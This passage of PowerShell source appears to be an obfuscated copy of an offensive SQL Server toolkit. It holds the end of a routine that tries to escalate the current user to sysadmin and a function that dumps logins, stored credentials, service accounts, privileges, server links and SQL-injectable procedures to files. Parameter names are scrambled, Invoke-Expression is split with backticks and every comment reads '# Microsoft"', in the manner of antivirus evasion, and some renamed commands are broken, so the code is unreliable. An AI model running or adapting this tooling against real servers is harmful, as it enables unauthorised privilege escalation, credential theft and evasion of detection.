            Write-Verbose -Message "$Instance : You're not a sysadmin, attempting to change that..."
            Invoke-SQLAudit -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -CattleEnter -RotLethal

            # Microsoft".
            $SelfHelp = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
            if($SelfHelp -eq 'Yes')
            {
                Write-Verbose -Message "$Instance : Success! You are now a sysadmin!"
            }
            else
            {
                Write-Verbose -Message "$Instance : Fail. We couldn't get you sysadmin access today."
            }
        }
    }

    End
    {
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLDumpInfo
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write output to.')]
        [string]$HopeBoil,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to xml files.')]
        [switch]$ArgueLearn,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to csv files.')]
        [switch]$csv
    )

    Begin
    {
        # Microsoft".
        if($HopeBoil)
        {
            $FarSteady = "echo test > $HopeBoil\test.txt"
        }
        else
        {
            $HopeBoil = '.'
            $FarSteady = "echo test > $HopeBoil\test.txt"
        }

        # Microsoft".
        $HealthLumpy = (inv`oke`-ex`pre`s`s`ion -SoakSame $FarSteady) 2>&1
        if($HealthLumpy -like '*denied.')
        {
            Write-CrazyChief -Object 'Access denied to output directory.'
            Return
        }
        else
        {
            Write-Verbose -Message 'Verified write access to output directory.'
            $TourMend = "del $HopeBoil\test.txt"
            inv`oke`-ex`pre`s`s`ion -SoakSame $TourMend
        }
    }

    Process
    {
        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            Return
        }

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        Write-Verbose -Message "$Instance - START..."
        $SkipJog = $Instance.Replace('\','-').Replace(',','-')

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting non-default databases..."
        $FlyCruel = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Databases.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Databases.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database users for databases..."
        $FlyCruel = Get-SQLDatabaseUser -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_Users.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_Users.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting privileges for databases..."
        $FlyCruel = Get-SQLDatabasePriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_privileges.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_privileges.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database roles..."
        $FlyCruel = Get-SQLDatabaseRole -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_roles.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_roles.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database role members..."
        $FlyCruel = Get-SQLDatabaseRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_role_members.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_role_members.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database schemas..."
        $FlyCruel = Get-SQLDatabaseSchema -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_schemas.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_schemas.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database tables..."
        $FlyCruel = Get-SQLTable -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_tables.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_tables.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database views..."
        $FlyCruel = Get-SQLView -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_views.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_views.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting database columns..."
        $FlyCruel = Get-SQLColumn -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -EggsBead
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_columns.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_columns.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server logins..."
        $FlyCruel = Get-SQLServerLogin -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_logins.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_logins.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server configuration settings..."
        $FlyCruel = Get-SQLServerConfiguration -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Configuration.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Configuration.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server privileges..."
        $FlyCruel = Get-SQLServerPriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_privileges.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_privileges.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server roles..."
        $FlyCruel = Get-SQLServerRole -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_roles.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_roles.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server role members..."
        $FlyCruel = Get-SQLServerRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_rolemembers.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_rolemembers.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server links..."
        $FlyCruel = Get-SQLServerLink -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_links.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_links.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server credentials..."
        $FlyCruel = Get-SQLServerCredential -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_credentials.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_credentials.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting SQL Server service accounts..."
        $FlyCruel = Get-SQLServiceAccount -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Service_accounts.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Service_accounts.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting stored procedures..."
        $FlyCruel = Get-SQLStoredProcedure -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting custom extended stored procedures..."
        $FlyCruel = Get-SQLStoredProcedureXP -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure_xp.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure_xp.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server policies..."
        $FlyCruel = Get-SQLServerPolicy -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_policy.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_policy.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting stored procedures with potential SQL Injection..."
        $FlyCruel = Get-SQLStoredProcedureSQLi -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure_sqli.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure_sqli.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting startup stored procedures..."
        $FlyCruel = Get-SQLStoredProcedureAutoExec -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure_startup.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedure_startup.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting CLR stored procedures..."
        $FlyCruel = Get-SQLStoredProcedureCLR -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_stored_procedur_CLR.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Database_CLR_stored_procedure_CLR.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting DML triggers..."
        $FlyCruel = Get-SQLTriggerDml -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_triggers_dml.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_triggers_dml.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting DDL triggers..."
        $FlyCruel = Get-SQLTriggerDdl -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_triggers_ddl.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_triggers_ddl.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting server version information..."
        $FlyCruel = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_triggers_dml.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_triggers_dml.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting Database audit specification information..."
        $FlyCruel = Get-SQLAuditDatabaseSpec -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Audit_Database_Specifications.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Audit_Database_Specifications.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting Server audit specification information..."
        $FlyCruel = Get-SQLAuditServerSpec -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Audit__Server_Specifications.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Audit_Server_Specifications.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting Agent Jobs information..."
        $FlyCruel = Get-SQLAgentJob -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Agent_Job.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_Agent_Jobs.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Getting OLE DB provder information..."
        $FlyCruel = Get-SQLOleDbProvder -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        if($ArgueLearn)
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_OleDbProvders.xml'
            $FlyCruel | Export-Clixml $StripComb
        }
        else
        {
            $StripComb = "$HopeBoil\$SkipJog"+'_Server_OleDbProvders.csv'
            $FlyCruel | Export-Csv -NoTypeInformation $StripComb
        }

        Write-Verbose -Message "$Instance - END"
    }
    End
    {
    }
}

# Microsoft".